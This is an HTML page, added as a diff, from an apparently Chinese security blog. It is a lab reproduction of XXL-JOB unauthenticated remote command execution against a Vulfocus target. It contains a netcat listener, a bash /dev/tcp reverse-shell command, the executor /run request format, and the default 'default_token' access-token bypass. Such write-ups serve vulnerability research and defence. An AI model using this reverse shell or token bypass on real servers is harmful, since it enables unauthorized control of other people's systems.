@@ -1,0 +1,244 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>XXL-JOB远程命令执行 | flyD</title>
+
+<link rel="shortcut icon" href="https://flyd.uk/favicon.ico?v=1699457449077">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://flyd.uk/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/dart.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/go.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.7.0/languages/python.min.js"></script>
+
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            flyD
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699457449077"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    XXL-JOB远程命令执行
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-11-05 ·
+                    </time>
+                    
+                        <a href="https://flyd.uk/cz6ULIw46/" class="post-tags">
+                            # 漏洞复现
+                        </a>
+                    
+                        <a href="https://flyd.uk/GLezFw5XL8/" class="post-tags">
+                            # RCE
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <p>XXL-JOB是一个轻量级分布式任务调度平台，用于实现大规模任务的调度和执行。<br>
+先前版本的XXL-JOB默认情况下API接口没有配置认证措施，现已加入accessToken，但公网仍然有大量使用默认token的机器。未授权的攻击者可构造恶意请求，触发反序列化，造成远程执行命令，直接控制服务器。</p>
+<!-- more -->
+<h2 id="老版本复现">老版本复现</h2>
+<p>老版本没有添加header中的token认证，可以直接RCE<br>
+使用Vulfocus提供的靶场环境，<code>flag</code>位于<code>/tmp</code>目录下<br>
+<img src="https://flyd.uk/post-images/1699122477812.png" alt="" loading="lazy"><br>
+攻击机nc监听8888端口<code>nc -lvn 8888</code><br>
+<img src="https://flyd.uk/post-images/1699122481692.png" alt="" loading="lazy"><br>
+靶机执行<code>/bin/bash -i &gt;&amp; /dev/tcp/172.17.0.1/8888 0&gt;&amp;1</code>反弹shell<br>
+根据文档给出的执行器API，构造如下请求<br>
+<img src="https://flyd.uk/post-images/1699122484347.png" alt="" loading="lazy"><br>
+成功反弹shell，执行命令获取flag<br>
+<img src="https://flyd.uk/post-images/1699122487895.png" alt="" loading="lazy"></p>
+<h2 id="文档地址">文档地址</h2>
+<p><a href="https://www.xuxueli.com/xxl-job/">https://www.xuxueli.com/xxl-job/</a></p>
+<pre><code>说明：触发任务执行
+------
+地址格式：{执行器内嵌服务根地址}/run
+Header：
+    XXL-JOB-ACCESS-TOKEN : {请求令牌}
+请求数据格式如下，放置在 RequestBody 中，JSON格式：
+    {
+        &quot;jobId&quot;:1,                                  // 任务ID
+        &quot;executorHandler&quot;:&quot;demoJobHandler&quot;,         // 任务标识
+        &quot;executorParams&quot;:&quot;demoJobHandler&quot;,          // 任务参数
+        &quot;executorBlockStrategy&quot;:&quot;COVER_EARLY&quot;,      // 任务阻塞策略，可选值参考 com.xxl.job.core.enums.ExecutorBlockStrategyEnum
+        &quot;executorTimeout&quot;:0,                        // 任务超时时间，单位秒，大于零时生效
+        &quot;logId&quot;:1,                                  // 本次调度日志ID
+        &quot;logDateTime&quot;:1586629003729,                // 本次调度日志时间
+        &quot;glueType&quot;:&quot;BEAN&quot;,                          // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum
+        &quot;glueSource&quot;:&quot;xxx&quot;,                         // GLUE脚本代码
+        &quot;glueUpdatetime&quot;:1586629003727,             // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新
+        &quot;broadcastIndex&quot;:0,                         // 分片参数：当前分片
+        &quot;broadcastTotal&quot;:0                          // 分片参数：总分片
+    }
+响应数据格式：
+    {
+      &quot;code&quot;: 200,      // 200 表示正常、其他失败
+      &quot;msg&quot;: null       // 错误提示消息
+    }
+</code></pre>
+<h2 id="默认token">默认token</h2>
+<p>配置文件位于<code>/xxl-job-admin/src/main/resources/application.properties</code><br>
+默认token的值<code>xxl.job.accessToken=default_token</code><br>
+在老版基础上添加一个<code>XXL-JOB-ACCESS-TOKEN: default_token</code>的header即可实现RCE</p>
+<h2 id="poc">PoC</h2>
+<p>老版PoC, 需要自行修改代码添加header: <a href="https://github.com/mrknow001/xxl-job-rce">https://github.com/mrknow001/xxl-job-rce</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://flyd.uk/post/DaHuaPoC/" class="post-title gt-a-link">
+                    大华PoC
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/xiaoWangSec" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    
+    <div class="slogan gt-c-content-color-first"><script type='text/javascript'>
+$.get("https://v1.hitokoto.cn/",function(data,status){
+  if (status == 'success'){
+    $('.slogan.gt-c-content-color-first').text(data.hitokoto);
+  }else{
+    $('.hitokoto').text('奈何明月照沟渠');
+  }
+});
+</script></div>
+
+    <!-- <div class="footer-info">
+        
+    </div> -->
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://flyd.uk/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
